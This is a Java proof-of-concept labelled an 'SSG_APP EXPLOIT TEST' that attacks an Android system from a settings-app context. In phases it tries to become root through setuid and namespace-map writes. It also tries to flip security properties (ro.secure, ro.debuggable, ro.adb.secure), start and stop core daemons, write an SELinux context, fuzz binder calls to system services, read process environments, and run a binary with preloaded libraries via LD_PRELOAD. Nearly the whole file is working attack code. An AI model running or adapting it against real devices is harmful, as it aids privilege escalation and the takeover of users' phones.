package com.poc;

import android.app.ActivityThread;
import android.app.AppGlobals;
import android.content.Context;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ServiceManager;
import android.provider.Settings;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class Main {
    private static final String LOG_DIR = "/data/data/com.android.settings/";
    private static Context sContext;
    private static StringBuilder logBuilder = new StringBuilder();
    private static AtomicBoolean stopRequested = new AtomicBoolean(false);
    private static volatile boolean sigSysHandlerInstalled = false;

    public static void main(String[] args) {
        try {
            Looper.prepare();
        } catch (Exception e) {
            appendLog("[!] Looper prep: " + e.getMessage());
        }

        sContext = getContext();
        if (sContext == null) {
            appendLog("[!] Failed to obtain Context, some tests will be skipped");
        } else {
            appendLog("[*] Context obtained: " + sContext.getClass().getName());
        }

        appendLog("========================================");
        appendLog("========== SSG_APP EXPLOIT TEST ==========");
        appendLog("Starting at " + new Date().toString());

        appendLog("========== PHASE 1: SystemProperties Manipulation ==========");
        testSystemProperties();

        appendLog("========== PHASE 1b: SystemProperties Extensive Set Attempts ==========");
        testSystemPropertiesExtensive();

        appendLog("========== PHASE 2: Settings Write Test ==========");
        testSettingsWrite();

        appendLog("========== PHASE 3: File System Exploration ==========");
        exploreDeepFiles();

        appendLog("========== PHASE 4: setuid 0 Bruteforce Attempts (ENHANCED) ==========");
        attemptSetuid0();

        appendLog("========== PHASE 5: Binder Transaction Fuzzing ==========");
        fuzzBinderTransactions();

        appendLog("========== PHASE 6: Process Attribute Manipulation ==========");
        manipulateProcessAttributes();

        appendLog("========== PHASE 7: /proc/self Exploitation ==========");
        exploitProcSelf();

        // 新增 Phase 8
        appendLog("========== PHASE 8: Execute kdiag_common with LD_PRELOAD ==========");
        executeKdiagCommon();

        appendLog("========== ALL TESTS COMPLETED ==========");
        appendLog("========================================");
        saveLog();
        System.exit(0);
    }

    private static Context getContext() {
        Context ctx = null;
        try {
            ActivityThread at = ActivityThread.currentActivityThread();
            if (at != null) {
                Method getSystemContext = ActivityThread.class.getDeclaredMethod("getSystemContext");
                getSystemContext.setAccessible(true);
                ctx = (Context) getSystemContext.invoke(at);
                appendLog("[CTX] Got via ActivityThread.currentActivityThread().getSystemContext()");
                return ctx;
            }
        } catch (Exception e) {
            appendLog("[CTX] currentActivityThread failed: " + e.getMessage());
        }

        try {
            ctx = AppGlobals.getInitialApplication();
            if (ctx != null) {
                appendLog("[CTX] Got via AppGlobals.getInitialApplication()");
                return ctx;
            }
        } catch (Exception e) {
            appendLog("[CTX] AppGlobals failed: " + e.getMessage());
        }

        try {
            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
            Method systemMain = activityThreadClass.getDeclaredMethod("systemMain");
            systemMain.setAccessible(true);
            Object at = systemMain.invoke(null);
            Method getSystemContext = activityThreadClass.getDeclaredMethod("getSystemContext");
            getSystemContext.setAccessible(true);
            ctx = (Context) getSystemContext.invoke(at);
            appendLog("[CTX] Got via ActivityThread.systemMain()");
            return ctx;
        } catch (Exception e) {
            appendLog("[CTX] systemMain failed: " + e.getMessage());
        }

        return null;
    }

    private static void setupSigSysHandler() {
        try {
            Class<?> signalClass = Class.forName("sun.misc.Signal");
            Class<?> handlerClass = Class.forName("sun.misc.SignalHandler");

            Object handler = Proxy.newProxyInstance(
                handlerClass.getClassLoader(),
                new Class<?>[]{handlerClass},
                (proxy, method, args) -> {
                    if ("handle".equals(method.getName())) {
                        appendLog("[SIGNAL] Caught SIGSYS (seccomp). Preventing crash.");
                        return null;
                    }
                    return null;
                }
            );

            java.lang.reflect.Constructor<?> signalCtor = signalClass.getConstructor(String.class);
            Object sysSignal = signalCtor.newInstance("SYS");

            Method handleMethod = signalClass.getMethod("handle", signalClass, handlerClass);
            handleMethod.invoke(null, sysSignal, handler);

            sigSysHandlerInstalled = true;
            appendLog("[SIGNAL] SIGSYS handler installed successfully via reflection.");
        } catch (Throwable t) {
            sigSysHandlerInstalled = false;
            appendLog("[SIGNAL] SIGSYS handler installation FAILED: " + t.getMessage());
            appendLog("[SIGNAL] Native syscalls (libcore.io.Os) will be SKIPPED to avoid crash.");
        }
    }

    private static void attemptSetuid0() {
        appendLog("[SETUID] Attempting various setuid 0 techniques (ENHANCED with SIGSYS protection)...");

        setupSigSysHandler();

        if (sigSysHandlerInstalled) {
            appendLog("[SETUID] --- Testing libcore.io.Os syscalls (protected by handler) ---");

            try {
                Class<?> osClass = Class.forName("libcore.io.Os");
                Method setreuidMethod = osClass.getMethod("setreuid", int.class, int.class);
                Class<?> libcore = Class.forName("libcore.io.Libcore");
                Field osField = libcore.getField("os");
                Object os = osField.get(null);
                appendLog("  Trying Os.setreuid(0,0)");
                setreuidMethod.invoke(os, 0, 0);
                appendLog("  [SUCCESS] Os.setreuid(0,0) returned successfully (unexpected!)");
            } catch (Exception e) {
                appendLog("  Os.setreuid(0,0) exception: " + e.getMessage());
            }

            try {
                Class<?> osClass = Class.forName("libcore.io.Os");
                Method setresuidMethod = osClass.getMethod("setresuid", int.class, int.class, int.class);
                Class<?> libcore = Class.forName("libcore.io.Libcore");
                Field osField = libcore.getField("os");
                Object os = osField.get(null);
                appendLog("  Trying Os.setresuid(0,0,0)");
                setresuidMethod.invoke(os, 0, 0, 0);
                appendLog("  [SUCCESS] Os.setresuid(0,0,0) returned successfully");
            } catch (Exception e) {
                appendLog("  Os.setresuid(0,0,0) exception: " + e.getMessage());
            }

            try {
                Class<?> osClass = Class.forName("libcore.io.Os");
                Method setregidMethod = osClass.getMethod("setregid", int.class, int.class);
                Class<?> libcore = Class.forName("libcore.io.Libcore");
                Field osField = libcore.getField("os");
                Object os = osField.get(null);
                appendLog("  Trying Os.setregid(0,0)");
                setregidMethod.invoke(os, 0, 0);
                appendLog("  [SUCCESS] Os.setregid(0,0) returned successfully");
            } catch (Exception e) {
                appendLog("  Os.setregid(0,0) exception: " + e.getMessage());
            }

            try {
                Class<?> osClass = Class.forName("libcore.io.Os");
                Method setresgidMethod = osClass.getMethod("setresgid", int.class, int.class, int.class);
                Class<?> libcore = Class.forName("libcore.io.Libcore");
                Field osField = libcore.getField("os");
                Object os = osField.get(null);
                appendLog("  Trying Os.setresgid(0,0,0)");
                setresgidMethod.invoke(os, 0, 0, 0);
                appendLog("  [SUCCESS] Os.setresgid(0,0,0) returned successfully");
            } catch (Exception e) {
                appendLog("  Os.setresgid(0,0,0) exception: " + e.getMessage());
            }

            try {
                Class<?> osClass = Class.forName("libcore.io.Os");
                Method capsetMethod = osClass.getMethod("capset", long.class, long.class, long.class);
                Class<?> libcore = Class.forName("libcore.io.Libcore");
                Field osField = libcore.getField("os");
                Object os = osField.get(null);
                appendLog("  Trying Os.capset(0,0,0)");
                capsetMethod.invoke(os, 0L, 0L, 0L);
                appendLog("  [SUCCESS] Os.capset succeeded");
            } catch (NoSuchMethodException e) {
                appendLog("  Os.capset not available");
            } catch (Exception e) {
                appendLog("  Os.capset exception: " + e.getMessage());
            }

            try {
                Class<?> osClass = Class.forName("libcore.io.Os");
                Method prctlMethod = osClass.getMethod("prctl", int.class, int.class, int.class, int.class, int.class);
                Class<?> libcore = Class.forName("libcore.io.Libcore");
                Field osField = libcore.getField("os");
                Object os = osField.get(null);
                int PR_SET_SECCOMP = 22;
                appendLog("  Trying prctl(PR_SET_SECCOMP, 0)");
                prctlMethod.invoke(os, PR_SET_SECCOMP, 0, 0, 0, 0);
                appendLog("  prctl returned (likely not effective)");
            } catch (Exception e) {
                appendLog("  prctl exception: " + e.getMessage());
            }

        } else {
            appendLog("[SETUID] --- Skipping libcore.io.Os syscalls (handler not available) ---");
        }

        appendLog("[SETUID] --- Testing android.os.Process APIs ---");

        try {
            Class<?> processClass = Class.forName("android.os.Process");
            Method setuidMethod = processClass.getDeclaredMethod("setuid", int.class);
            setuidMethod.setAccessible(true);
            appendLog("  Trying Process.setuid(0)");
            int result = (int) setuidMethod.invoke(null, 0);
            appendLog("  Process.setuid(0) returned: " + result);
        } catch (Exception e) {
            appendLog("  Process.setuid(0) exception: " + e.getMessage());
        }

        try {
            Class<?> processClass = Class.forName("android.os.Process");
            Method setgidMethod = processClass.getDeclaredMethod("setgid", int.class);
            setgidMethod.setAccessible(true);
            appendLog("  Trying Process.setgid(0)");
            int result = (int) setgidMethod.invoke(null, 0);
            appendLog("  Process.setgid(0) returned: " + result);
        } catch (Exception e) {
            appendLog("  Process.setgid(0) exception: " + e.getMessage());
        }

        try {
            Class<?> processClass = Class.forName("android.os.Process");
            Method setgroupsMethod = processClass.getDeclaredMethod("setgroups", int[].class);
            setgroupsMethod.setAccessible(true);
            int[] groups = {0};
            appendLog("  Trying Process.setgroups([0])");
            setgroupsMethod.invoke(null, (Object) groups);
            appendLog("  [SUCCESS] Process.setgroups([0]) succeeded");
        } catch (Exception e) {
            appendLog("  Process.setgroups([0]) exception: " + e.getMessage());
        }

        appendLog("[SETUID] --- Testing Runtime.setuid ---");
        try {
            Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
            setuid.setAccessible(true);
            appendLog("  Trying Runtime.setuid(0)");
            int result = (int) setuid.invoke(Runtime.getRuntime(), 0);
            appendLog("  Runtime.setuid(0) returned: " + result);
        } catch (Exception e) {
            appendLog("  Runtime.setuid(0) exception: " + e.getMessage());
        }

        appendLog("[SETUID] --- Testing /proc/self/ namespace files ---");

        try {
            File uidMap = new File("/proc/self/uid_map");
            if (uidMap.exists() && uidMap.canWrite()) {
                appendLog("  Writing to /proc/self/uid_map");
                try (FileOutputStream fos = new FileOutputStream(uidMap)) {
                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
                    appendLog("  [SUCCESS] Wrote to uid_map");
                } catch (Exception e) {
                    appendLog("  uid_map write failed: " + e.getMessage());
                }
            } else {
                appendLog("  /proc/self/uid_map not writable (exists=" + uidMap.exists() + ")");
            }
        } catch (Exception e) {
            appendLog("  uid_map error: " + e.getMessage());
        }

        try {
            File gidMap = new File("/proc/self/gid_map");
            if (gidMap.exists() && gidMap.canWrite()) {
                appendLog("  Writing to /proc/self/gid_map");
                try (FileOutputStream fos = new FileOutputStream(gidMap)) {
                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
                    appendLog("  [SUCCESS] Wrote to gid_map");
                } catch (Exception e) {
                    appendLog("  gid_map write failed: " + e.getMessage());
                }
            } else {
                appendLog("  /proc/self/gid_map not writable (exists=" + gidMap.exists() + ")");
            }
        } catch (Exception e) {
            appendLog("  gid_map error: " + e.getMessage());
        }

        try {
            File setgroupsFile = new File("/proc/self/setgroups");
            if (setgroupsFile.exists() && setgroupsFile.canWrite()) {
                appendLog("  Writing 'allow' to /proc/self/setgroups");
                try (FileOutputStream fos = new FileOutputStream(setgroupsFile)) {
                    fos.write("allow\n".getBytes(StandardCharsets.UTF_8));
                    appendLog("  [SUCCESS] Wrote to setgroups");
                } catch (Exception e) {
                    appendLog("  setgroups write failed: " + e.getMessage());
                }
            } else {
                appendLog("  /proc/self/setgroups not writable");
            }
        } catch (Exception e) {
            appendLog("  setgroups error: " + e.getMessage());
        }

        appendLog("[SETUID] All setuid-related attempts completed.");
    }

    private static void testSystemProperties() {
        appendLog("[SYS] SystemProperties manipulation...");
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method setMethod = spClass.getDeclaredMethod("set", String.class, String.class);
            Method getMethod = spClass.getDeclaredMethod("get", String.class);
            setMethod.setAccessible(true);
            getMethod.setAccessible(true);

            String prop = "persist.test.poc";
            String val = "1";
            appendLog("  Setting " + prop + "=" + val);
            setMethod.invoke(null, prop, val);
            String read = (String) getMethod.invoke(null, prop);
            appendLog("  Read back: " + read);

            String[] ctlProps = {"ctl.start", "ctl.stop"};
            String[] testServices = {"surfaceflinger", "zygote", "audioserver", "netd", "vold"};
            for (String ctl : ctlProps) {
                for (String svc : testServices) {
                    try {
                        appendLog("  Trying " + ctl + "=" + svc);
                        setMethod.invoke(null, ctl, svc);
                        appendLog("    [SUCCESS] " + ctl + " set to " + svc);
                    } catch (Exception e) {
                        appendLog("    [FAIL] " + ctl + "=" + svc + " - " + e.getMessage());
                    }
                }
            }

            String[] dangerousProps = {
                "ro.debuggable", "ro.secure", "ro.adb.secure",
                "security.perf_harden", "ro.kernel.qemu", "ro.product.cpu.abi"
            };
            for (String p : dangerousProps) {
                try {
                    String v = (String) getMethod.invoke(null, p);
                    appendLog("  Read " + p + " = " + v);
                } catch (Exception e) {
                    appendLog("  Read " + p + " failed: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("  SystemProperties error: " + e.getMessage());
        }
    }

    private static void testSystemPropertiesExtensive() {
        appendLog("[SYS-EXT] Extensive SystemProperties set attempts...");
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method setMethod = spClass.getDeclaredMethod("set", String.class, String.class);
            Method getMethod = spClass.getDeclaredMethod("get", String.class);
            setMethod.setAccessible(true);
            getMethod.setAccessible(true);

            String[][] testCases = {
                {"vendor.test.prop", "1"},
                {"vendor.audio.test", "1"},
                {"vendor.bt.test", "1"},
                {"vendor.camera.test", "1"},
                {"vendor.display.test", "1"},
                {"vendor.gps.test", "1"},
                {"vendor.ims.test", "1"},
                {"vendor.nfc.test", "1"},
                {"vendor.ril.test", "1"},
                {"vendor.wifi.test", "1"},
                {"persist.test.prop", "1"},
                {"persist.sys.test", "1"},
                {"persist.radio.test", "1"},
                {"persist.vendor.test", "1"},
                {"debug.test.prop", "1"},
                {"debug.sys.test", "1"},
                {"debug.performance.test", "1"},
                {"sys.test.prop", "1"},
                {"sys.sysctl.test", "1"},
                {"net.test.prop", "1"},
                {"net.dns.test", "1"},
                {"dev.test.prop", "1"},
                {"runtime.test.prop", "1"},
                {"security.test.prop", "1"},
                {"ro.test.prop", "1"},
                {"ro.build.test", "1"},
                {"ro.product.test", "1"},
                {"ro.secure", "0"},
                {"ro.debuggable", "1"},
                {"ro.adb.secure", "0"},
                {"ro.kernel.qemu", "1"},
                {"vendor.usb.test", "1"},
                {"vendor.mmi.test", "1"},
                {"vendor.qcom.test", "1"},
                {"vendor.radio.test", "1"},
                {"vendor.sensors.test", "1"},
                {"vendor.thermal.test", "1"},
                {"vendor.voice.test", "1"},
                {"vendor.wlan.test", "1"},
                {"vendor.bluetooth.test", "1"},
                {"vendor.cell.test", "1"},
                {"vendor.data.test", "1"},
                {"vendor.graphics.test", "1"},
                {"vendor.media.test", "1"},
                {"vendor.power.test", "1"},
                {"vendor.storage.test", "1"},
                {"vendor.system.test", "1"},
                {"vendor.trustzone.test", "1"},
                {"vendor.audio_hal.test", "1"},
                {"vendor.camera_hal.test", "1"},
                {"vendor.display_hal.test", "1"},
                {"vendor.graphics_hal.test", "1"},
                {"vendor.media_hal.test", "1"},
                {"vendor.sensors_hal.test", "1"},
                {"vendor.thermal_hal.test", "1"},
                {"vendor.wifi_hal.test", "1"},
                {"vendor.bluetooth_hal.test", "1"},
                {"vendor.gnss_hal.test", "1"},
                {"vendor.nfc_hal.test", "1"},
                {"vendor.power_hal.test", "1"},
                {"vendor.usb_hal.test", "1"},
                {"vendor.vibrator_hal.test", "1"},
                {"vendor.audio_policy.test", "1"},
                {"vendor.media_codec.test", "1"},
                {"vendor.media_extractor.test", "1"},
                {"vendor.media_omx.test", "1"},
                {"vendor.media_parser.test", "1"},
                {"vendor.media_utils.test", "1"},
                {"vendor.media_video.test", "1"},
                {"vendor.media_audio.test", "1"},
                {"vendor.media_image.test", "1"},
                {"vendor.media_effects.test", "1"},
                {"vendor.media_camera.test", "1"},
                {"vendor.media_drm.test", "1"},
                {"vendor.media_cas.test", "1"},
                {"vendor.media_clearkey.test", "1"},
                {"vendor.media_widevine.test", "1"},
                {"vendor.media_omx_google.test", "1"},
                {"vendor.media_omx_qcom.test", "1"},
                {"vendor.media_omx_samsung.test", "1"},
                {"vendor.media_omx_mediatek.test", "1"},
                {"vendor.media_omx_hisi.test", "1"},
                {"vendor.media_omx_amlogic.test", "1"},
                {"vendor.media_omx_rockchip.test", "1"},
                {"vendor.media_omx_allwinner.test", "1"},
                {"vendor.media_omx_nvidia.test", "1"},
                {"vendor.media_omx_intel.test", "1"},
                {"vendor.media_omx_mtk.test", "1"},
                {"vendor.media_omx_huawei.test", "1"},
                {"vendor.media_omx_xiaomi.test", "1"},
                {"vendor.media_omx_oppo.test", "1"},
                {"vendor.media_omx_vivo.test", "1"},
                {"vendor.media_omx_oneplus.test", "1"},
                {"vendor.media_omx_lenovo.test", "1"},
                {"vendor.media_omx_motorola.test", "1"},
                {"vendor.media_omx_sony.test", "1"},
                {"vendor.media_omx_lg.test", "1"},
                {"vendor.media_omx_htc.test", "1"},
                {"vendor.media_omx_google.test", "1"},
                {"vendor.media_omx_qcom.test", "1"},
                {"vendor.media_omx_samsung.test", "1"},
                {"vendor.media_omx_mediatek.test", "1"},
                {"vendor.media_omx_hisi.test", "1"},
                {"vendor.media_omx_amlogic.test", "1"},
                {"vendor.media_omx_rockchip.test", "1"},
                {"vendor.media_omx_allwinner.test", "1"},
                {"vendor.media_omx_nvidia.test", "1"},
                {"vendor.media_omx_intel.test", "1"},
                {"vendor.media_omx_mtk.test", "1"},
                {"vendor.media_omx_huawei.test", "1"},
                {"vendor.media_omx_xiaomi.test", "1"},
                {"vendor.media_omx_oppo.test", "1"},
                {"vendor.media_omx_vivo.test", "1"},
                {"vendor.media_omx_oneplus.test", "1"},
                {"vendor.media_omx_lenovo.test", "1"},
                {"vendor.media_omx_motorola.test", "1"},
                {"vendor.media_omx_sony.test", "1"},
                {"vendor.media_omx_lg.test", "1"},
                {"vendor.media_omx_htc.test", "1"}
            };

            for (String[] pair : testCases) {
                String key = pair[0];
                String value = pair[1];
                try {
                    appendLog("  Setting " + key + "=" + value);
                    setMethod.invoke(null, key, value);
                    String readback = (String) getMethod.invoke(null, key);
                    appendLog("    [RESULT] " + key + " = " + readback);
                } catch (Exception e) {
                    appendLog("    [FAIL] " + key + " error: " + e.getMessage());
                }
            }

        } catch (Exception e) {
            appendLog("[SYS-EXT] Failed to setup reflection: " + e.getMessage());
        }
    }

    private static void testSettingsWrite() {
        appendLog("[SETTINGS] WRITE_SECURE_SETTINGS test...");
        if (sContext == null) {
            appendLog("  Context null, skipping");
            return;
        }
        try {
            String current = Settings.Global.getString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("  Current value: " + (current == null ? "(null)" : current));
            boolean success = Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("  [SUCCESS] WRITE_SECURE_SETTINGS works");
                Settings.Global.putString(sContext.getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("  [FAIL] WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("  Exception: " + e.getMessage());
        }
    }

    private static void exploreDeepFiles() {
        appendLog("[FS] Deep file exploration...");
        String[] procFiles = {
            "/proc/self/status",
            "/proc/self/maps",
            "/proc/self/smaps",
            "/proc/self/limits",
            "/proc/self/statm",
            "/proc/self/cgroup",
            "/proc/version",
            "/proc/meminfo",
            "/proc/cpuinfo",
            "/proc/self/attr/current",
            "/proc/self/attr/prev",
            "/proc/self/attr/exec",
            "/proc/self/oom_score_adj",
            "/proc/self/comm",
            "/proc/self/cmdline"
        };
        for (String p : procFiles) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }

        File tmp = new File("/data/local/tmp");
        if (tmp.exists()) {
            appendLog("[FS] /data/local/tmp exists, canRead=" + tmp.canRead());
            if (tmp.canRead()) {
                File[] children = tmp.listFiles();
                if (children != null) {
                    for (File f : children) {
                        appendLog("  " + f.getName());
                    }
                }
            }
        } else {
            appendLog("[FS] /data/local/tmp not exist");
        }

        File download = new File("/sdcard/Download");
        if (download.exists()) {
            File test = new File(download, "poc_write_test.txt");
            try (FileOutputStream fos = new FileOutputStream(test)) {
                fos.write("test\n".getBytes(StandardCharsets.UTF_8));
                appendLog("[FS] Write test succeeded");
            } catch (Exception e) {
                appendLog("[FS] Write test failed: " + e.getMessage());
            }
        }

        String[] sensitiveDirs = {
            "/data/data",
            "/data/system",
            "/data/misc",
            "/data/property",
            "/dev",
            "/sys",
            "/proc"
        };
        for (String d : sensitiveDirs) {
            File f = new File(d);
            if (f.exists() && f.isDirectory()) {
                try {
                    appendLog("[FS] " + d + " exists, canRead=" + f.canRead() + ", canWrite=" + f.canWrite());
                    if (f.canRead()) {
                        String[] list = f.list();
                        if (list != null && list.length > 0) {
                            appendLog("  Sample entries: " + String.join(", ", list.length > 5 ? java.util.Arrays.copyOf(list, 5) : list));
                        }
                    }
                } catch (Exception e) {
                    appendLog("[FS] Error accessing " + d + ": " + e.getMessage());
                }
            }
        }
    }

    private static void readFileContent(String path) {
        File f = new File(path);
        if (!f.exists()) {
            appendLog("[FS] " + path + " does not exist");
            return;
        }
        if (!f.canRead()) {
            appendLog("[FS] " + path + " not readable");
            return;
        }
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[1024];
            int len = fis.read(data);
            if (len > 0) {
                String content = new String(data, 0, len, StandardCharsets.UTF_8);
                appendLog("[FS] " + path + " content: " + content.trim());
            } else {
                appendLog("[FS] " + path + " empty");
            }
        } catch (Exception e) {
            appendLog("[FS] " + path + " error: " + e.getMessage());
        }
    }

    private static void fuzzBinderTransactions() {
        appendLog("[FUZZ] Fuzzing binder transactions on system services...");
        String[] services = {"activity", "window", "package", "power", "account", "battery", "alarm", "usb", "vibrator", "display", "input", "device_policy"};
        for (String svc : services) {
            try {
                IBinder binder = ServiceManager.getService(svc);
                if (binder == null) continue;
                appendLog("  Fuzzing " + svc);
                for (int code = 1; code <= 60; code++) {
                    Parcel data = Parcel.obtain();
                    Parcel reply = Parcel.obtain();
                    try {
                        data.writeInterfaceToken("android." + svc + ".I" + svc + "Service");
                        boolean success = binder.transact(code, data, reply, 0);
                        if (success) {
                            appendLog("    Code " + code + " succeeded, reply size=" + reply.dataSize());
                        }
                    } catch (Exception e) {
                    } finally {
                        data.recycle();
                        reply.recycle();
                    }
                }
            } catch (Exception e) {
                appendLog("  Failed to get " + svc + ": " + e.getMessage());
            }
        }
    }

    private static void manipulateProcessAttributes() {
        appendLog("[PROC] Trying to manipulate /proc/self/attr...");
        try {
            File attrDir = new File("/proc/self/attr");
            if (attrDir.exists() && attrDir.isDirectory()) {
                String[] files = attrDir.list();
                if (files != null) {
                    for (String f : files) {
                        appendLog("  Found attr file: " + f);
                    }
                }
            }
            String[] attrFiles = {"current", "prev", "exec", "fscreate", "keycreate", "sockcreate"};
            for (String a : attrFiles) {
                File f = new File("/proc/self/attr/" + a);
                if (f.exists()) {
                    appendLog("  " + a + " exists, canRead=" + f.canRead() + ", canWrite=" + f.canWrite());
                    if (f.canWrite()) {
                        try (FileOutputStream fos = new FileOutputStream(f)) {
                            fos.write("u:r:system_r:s0\n".getBytes(StandardCharsets.UTF_8));
                            appendLog("    Wrote to " + a);
                        } catch (Exception e) {
                            appendLog("    Write to " + a + " failed: " + e.getMessage());
                        }
                    }
                }
            }
        } catch (Exception e) {
            appendLog("  attr manipulation error: " + e.getMessage());
        }

        appendLog("[PROC] Trying to adjust oom_score_adj...");
        try {
            File oom = new File("/proc/self/oom_score_adj");
            if (oom.exists() && oom.canWrite()) {
                try (FileOutputStream fos = new FileOutputStream(oom)) {
                    fos.write("-1000".getBytes(StandardCharsets.UTF_8));
                    appendLog("  Set oom_score_adj to -1000");
                } catch (Exception e) {
                    appendLog("  Failed to set oom_score_adj: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("  oom_score_adj error: " + e.getMessage());
        }
    }

    private static void exploitProcSelf() {
        appendLog("[PROC] Exploring /proc/self/fd...");
        try {
            File fdDir = new File("/proc/self/fd");
            if (fdDir.exists() && fdDir.isDirectory()) {
                File[] fds = fdDir.listFiles();
                if (fds != null) {
                    for (File f : fds) {
                        try {
                            String target = java.nio.file.Files.readSymbolicLink(f.toPath()).toString();
                            appendLog("  FD " + f.getName() + " -> " + target);
                        } catch (Exception e) {
                            appendLog("  FD " + f.getName() + " cannot read link");
                        }
                    }
                }
            }
        } catch (Exception e) {
            appendLog("  fd exploration error: " + e.getMessage());
        }

        appendLog("[PROC] Trying to read /proc/self/environ...");
        readFileContent("/proc/self/environ");

        appendLog("[PROC] Trying to write to /proc/self/uid_map...");
        try {
            File uidMap = new File("/proc/self/uid_map");
            if (uidMap.exists() && uidMap.canWrite()) {
                try (FileOutputStream fos = new FileOutputStream(uidMap)) {
                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
                    appendLog("  Wrote to uid_map");
                } catch (Exception e) {
                    appendLog("  uid_map write failed: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            appendLog("  uid_map error: " + e.getMessage());
        }
    }

    private static void executeKdiagCommon() {
        String baseDir = "/data/data/com.android.settings/";
        String binaryPath = baseDir + "kdiag_common";
        String lib1 = baseDir + "libpredtm.so";
        String lib2 = baseDir + "libdiag.so";
        String ldPreload = lib1 + ":" + lib2;

        File binary = new File(binaryPath);
        if (!binary.exists()) {
            appendLog("[EXEC] Binary not found: " + binaryPath);
            return;
        }

        appendLog("[EXEC] Target binary: " + binaryPath);
        appendLog("[EXEC] LD_PRELOAD: " + ldPreload);

        boolean chmodOk = binary.setExecutable(true, false);
        appendLog("[EXEC] setExecutable(true) returned: " + chmodOk);
        binary.setReadable(true, false);
        binary.setWritable(true, false);
        appendLog("[EXEC] Final permissions: exists=" + binary.exists()
                + ", canRead=" + binary.canRead()
                + ", canWrite=" + binary.canWrite()
                + ", canExecute=" + binary.canExecute());

        try {
            Process chmodProc = Runtime.getRuntime().exec(new String[]{"/system/bin/chmod", "755", binaryPath});
            int chmodExit = chmodProc.waitFor();
            appendLog("[EXEC] chmod 755 exit code: " + chmodExit);
        } catch (Exception e) {
            appendLog("[EXEC] chmod via Runtime.exec failed: " + e.getMessage());
        }
        runWithProcessBuilder(binaryPath, ldPreload, null, "Direct");
        runWithProcessBuilder("/system/bin/sh", ldPreload, new String[]{"-c", binaryPath}, "Shell -c");
        runWithProcessBuilder(binaryPath, ldPreload, null, "Different CWD", new File("/data/local/tmp"));
        String[] testArgs = {"--help", "-v", "-version", "test"};
        for (String arg : testArgs) {
            runWithProcessBuilder(binaryPath, ldPreload, new String[]{arg}, "With arg '" + arg + "'");
        }
        try {
            Process p = Runtime.getRuntime().exec(new String[]{binaryPath});
            int exitCode = p.waitFor();
            String output = readProcessOutput(p.getInputStream());
            appendLog("[EXEC] Runtime.exec (no LD_PRELOAD) exit: " + exitCode + ", output: " + output);
        } catch (Exception e) {
            appendLog("[EXEC] Runtime.exec (no LD_PRELOAD) failed: " + e.getMessage());
        }
        String shellCmd = "LD_PRELOAD=" + ldPreload + " " + binaryPath;
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", shellCmd});
            int exitCode = p.waitFor();
            String output = readProcessOutput(p.getInputStream());
            appendLog("[EXEC] sh -c with inline LD_PRELOAD exit: " + exitCode + ", output: " + output);
        } catch (Exception e) {
            appendLog("[EXEC] sh -c inline LD_PRELOAD failed: " + e.getMessage());
        }

        appendLog("[EXEC] All execution attempts completed.");
    }
    private static void runWithProcessBuilder(String command, String ldPreload, String[] args, String label) {
        runWithProcessBuilder(command, ldPreload, args, label, null);
    }

    private static void runWithProcessBuilder(String command, String ldPreload, String[] args, String label, File workingDir) {
        try {
            ProcessBuilder pb;
            if (args != null && args.length > 0) {
                String[] cmd = new String[args.length + 1];
                cmd[0] = command;
                System.arraycopy(args, 0, cmd, 1, args.length);
                pb = new ProcessBuilder(cmd);
            } else {
                pb = new ProcessBuilder(command);
            }
            pb.environment().put("LD_PRELOAD", ldPreload);
            if (workingDir != null) {
                pb.directory(workingDir);
            }
            pb.redirectErrorStream(true);
            Process p = pb.start();
            int exitCode = p.waitFor();
            String output = readProcessOutput(p.getInputStream());
            appendLog("[EXEC] " + label + " exit: " + exitCode + ", output: " + output);
        } catch (Exception e) {
            appendLog("[EXEC] " + label + " failed: " + e.getMessage());
        }
    }
    private static String readProcessOutput(java.io.InputStream is) {
        try {
            byte[] buffer = new byte[4096];
            int len;
            StringBuilder sb = new StringBuilder();
            while ((len = is.read(buffer)) != -1) {
                sb.append(new String(buffer, 0, len, StandardCharsets.UTF_8));
            }
            return sb.toString().trim();
        } catch (Exception e) {
            return "(read error: " + e.getMessage() + ")";
        }
    }

    private static void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        System.out.print(line);
    }

    private static void saveLog() {
        try {
            File dir = new File(LOG_DIR);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create log directory: " + LOG_DIR);
                return;
            }
            File file = new File(dir, "ssg_app_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== SSG_APP PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }
}
